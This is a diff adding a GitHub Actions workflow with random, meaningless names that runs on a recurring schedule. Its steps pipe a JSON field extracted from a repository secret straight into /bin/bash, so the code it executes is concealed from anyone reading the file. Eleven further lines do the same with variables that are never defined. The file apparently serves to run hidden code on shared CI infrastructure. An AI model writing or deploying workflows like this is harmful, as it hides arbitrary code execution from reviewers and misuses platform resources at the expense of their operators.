@@ -1,0 +1,27 @@
+name: minguangshengjun
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: minguangshengjun
+        env:
+          feekp58595: ${{ secrets.feekp58595 }}
+        run: |
+          echo $feekp58595 | jq -r .mrv77578 | /bin/bash
+          echo $xq77 | jq -r .r036 | /bin/bash
+          echo $zpnwc0198 | jq -r .k4 | /bin/bash
+          echo $sds4933 | jq -r .vlg2 | /bin/bash
+          echo $vz93 | jq -r .ro57163 | /bin/bash
+          echo $rhcn67 | jq -r .kihsy4 | /bin/bash
+          echo $qqb40 | jq -r .kwid41 | /bin/bash
+          echo $sj7 | jq -r .j6554 | /bin/bash
+          echo $zyx9 | jq -r .ro042 | /bin/bash
+          echo $u54287 | jq -r .ymtcv52599 | /bin/bash
+          echo $yf566 | jq -r .nii427 | /bin/bash
+          echo $augo84487 | jq -r .frmx7163 | /bin/bash
+
